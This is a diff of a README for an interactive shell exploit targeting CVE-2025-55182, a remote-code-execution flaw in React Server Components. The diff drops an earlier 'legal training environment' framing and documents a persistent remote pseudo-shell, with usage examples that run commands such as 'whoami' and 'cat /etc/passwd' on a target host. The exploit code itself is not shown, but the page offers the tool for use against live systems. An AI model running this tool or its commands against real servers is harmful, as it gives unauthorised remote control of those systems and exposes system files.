@@ -1,41 +1,52 @@
-This repository contains a proof‑of‑concept demonstrating how a specific class of React Server Component vulnerabilities behaves inside a **controlled, legal training environment**.  
+# react2int-shell
 
-## Manual
+Interactive shell exploit for **CVE-2025-55182** — React Server Components RCE.
+
+Forked from [surajhacx/react2shellpoc](https://github.com/surajhacx/react2shellpoc) with added interactive shell mode and TAB completion.
+
+## Install
+
+```bash
+pip install -r requirements.txt
+```
+
+## Usage
+
+### Interactive shell (default)
 
 ```
-┌──(kali㉿kali)-[~/Documents/tools/2025-55182]                                                                          
-└─$ python exploit.py -h                                                                                                
-                                                                                                         
-                                                                                                         
-      /\                                                                                                 
-     /**\
-    /****\
-   /******\
-  /********\
- /**********\
-      ||     
-                          
-    [CVE-2025-55182 React Server Components RCE]            
-                                                    
-usage: exploit.py [-h] [-t URL] [-c CMD]                    
-                                                    
-options:                      
-  -h, --help         show this help message and exit                                                                    
-  -t, --target URL   Target URL or domain (default: http://hacx.me)
-  -c, --command CMD  Command to execute on target (default: id)    
-                                                                                                         
-Examples:                     
-  exploit.py -t hacx.me -c "whoami"                         
+python exploit.py -t <target>
+```
+
+Drops into a persistent pseudo-shell with:
+- Working directory tracking (`cd` persists between commands)
+- TAB completion for filenames (refreshed after each `cd`)
+- Type `exit` or `quit` to close
+
+### Single command
+
+```
+python exploit.py -t <target> -c "whoami"
+```
+
+### Help
+
+```
+python exploit.py -h
+
+usage: exploit.py [-h] [-t URL] [-c CMD]
+
+options:
+  -h, --help         show this help message and exit
+  -t, --target URL   Target URL or domain
+  -c, --command CMD  Single command to execute (omit for interactive shell)
+
+Examples:
+  exploit.py -t hacx.me                          # interactive shell
+  exploit.py -t hacx.me -c "whoami"              # single command
   exploit.py -t http://hacx.me -c "cat /etc/passwd"
-  exploit.py -t hacx.me -c "ls -la /var/www"
 ```
 
-## Video PoC
+## Credits
 
-![poc2](https://github.com/user-attachments/assets/d1d86d72-39cb-4af8-9dca-611a0cad9ef7)
-
-
-
-
-
-
+Original exploit by [surajhacx](https://github.com/surajhacx) (hacx.me)
